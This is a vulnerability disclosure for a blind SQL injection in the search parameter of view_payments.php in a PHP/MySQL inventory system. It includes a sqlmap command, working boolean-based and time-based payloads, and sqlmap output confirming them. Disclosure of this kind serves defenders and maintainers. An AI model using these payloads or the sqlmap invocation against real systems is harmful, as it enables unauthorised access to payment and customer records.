# SQL Injection in Inventory System (View Payments)

## Overview

* **Vulnerability Type**: SQL Injection (Boolean-based Blind / Time-based Blind)
* **Product**: [Inventory System](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
* **Version**: 1.0
* **Component**: Payments View (`view_payments.php`)
* **Vulnerable Parameter**: `searchtxt` (POST)

## Description

A SQL Injection vulnerability exists in the **Inventory System**. The vulnerability is located in the `view_payments.php` file.

The application fails to properly sanitize the `searchtxt` parameter in the HTTP POST request (triggered by the search functionality on the payments list page). This allows an authenticated attacker to inject arbitrary SQL commands. Since the backend database is **MySQL**, attackers can exploit this using Boolean-based or Time-based blind injection techniques (e.g., using `SLEEP()`) to enumerate database structures and exfiltrate sensitive data.

## Steps to Reproduce

1. **Setup**: Deploy the Inventory System locally.
2. **Login**: Log in to the application.
3. **Exploit**: Use the search bar to submit malicious SQL payloads, or capture the request and use a tool like `sqlmap`.

**SQLMap Command:**

```bash
sqlmap -u "http://127.0.0.1:8089/view_payments.php" \
--data "searchtxt=test_payment&Search=Search" \
--batch -v 6 --risk=3 \
--cookie "PHPSESSID=YOUR_COOKIE_HERE"

```

## PoC Payload

**Boolean-based Blind Payload:**

```sql
searchtxt=-4866' OR 6593=6593#&Search=Search

```

**Time-based Blind Payload (MySQL):**

```sql
searchtxt=test_payment' AND (SELECT 4804 FROM (SELECT(SLEEP(5)))uxmy)-- fifg&Search=Search

```

## Proof of Concept

The following output from `sqlmap` confirms that the `searchtxt` parameter is vulnerable.

```text
Parameter: searchtxt (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchtxt=-4866' OR 6593=6593#&Search=Search
    Vector: OR [INFERENCE]#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchtxt=test_payment' AND (SELECT 4804 FROM (SELECT(SLEEP(5)))uxmy)-- fifg&Search=Search
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
[INFO] the back-end DBMS is MySQL

```

<img width="885" height="286" alt="图片" src="https://github.com/user-attachments/assets/a48b28dc-0e3f-4ab7-8c98-326b7860ba3f" />


## Impact

This vulnerability allows an attacker to:

1. **Exfiltrate Data**: Retrieve sensitive information from the MySQL database, including payment records, customer details, and transaction history.
2. **Database Enumeration**: Identify tables, columns, and database schema.

## Reference

* [Project Source Code](https://www.sourcecodester.com/php/7760/inventory-system-php-and-mysql.html)
